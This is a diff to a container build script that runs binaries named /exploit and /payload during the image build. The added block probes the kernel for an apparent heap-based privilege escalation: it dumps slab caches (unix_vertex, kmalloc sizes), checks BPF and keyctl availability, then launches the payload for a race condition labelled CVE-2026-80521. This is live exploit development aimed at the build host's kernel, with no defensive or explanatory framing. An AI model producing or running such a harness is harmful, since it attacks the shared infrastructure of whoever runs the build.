@@ -7,7 +7,7 @@ COPY payload /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
-ARG CACHEBUST=1376
+ARG CACHEBUST=1377
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -37,6 +37,19 @@ case "$KVER" in \
     echo "--- MODULE CHECK ---"; \
     grep sctp /proc/modules 2>/dev/null && echo "SCTP_MODULE=loaded" || echo "SCTP_MODULE=absent"; \
     grep unix_walk_scc /proc/kallsyms 2>/dev/null | head -1 && echo "SCC_GC=present" || echo "SCC_GC=absent"; \
+    echo "--- FAST RECON (same-cache + alt alloc) ---"; \
+    echo "=== SLABINFO ==="; \
+    cat /proc/slabinfo 2>/dev/null | head -3; \
+    cat /proc/slabinfo 2>/dev/null | grep -E "unix_vertex|kmalloc-(32|64|96|128|192|256) " | head -12; \
+    ls -la /sys/kernel/slab/unix_vertex 2>/dev/null && echo "SLAB_DEDICATED=yes" || echo "SLAB_DEDICATED=no"; \
+    ls /sys/kernel/slab/ 2>/dev/null | grep -i unix | head -5; \
+    echo "=== SLABINFO END ==="; \
+    echo "=== SYSCALL PROBES ==="; \
+    cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null && echo "" || echo "BPF_SYSCTL=unreadable"; \
+    ls /sys/bus/workqueue/devices/ 2>/dev/null | head -5; \
+    cat /sys/bus/workqueue/devices/*/cpumask 2>/dev/null | head -3; \
+    echo "KEYCTL_TEST:"; keyctl request user test 2>&1 | head -1 || echo "keyctl_absent"; \
+    echo "=== SYSCALL PROBES END ==="; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     echo "PAYLOAD START" >&2; \
     timeout 420 /payload 2>&1; \
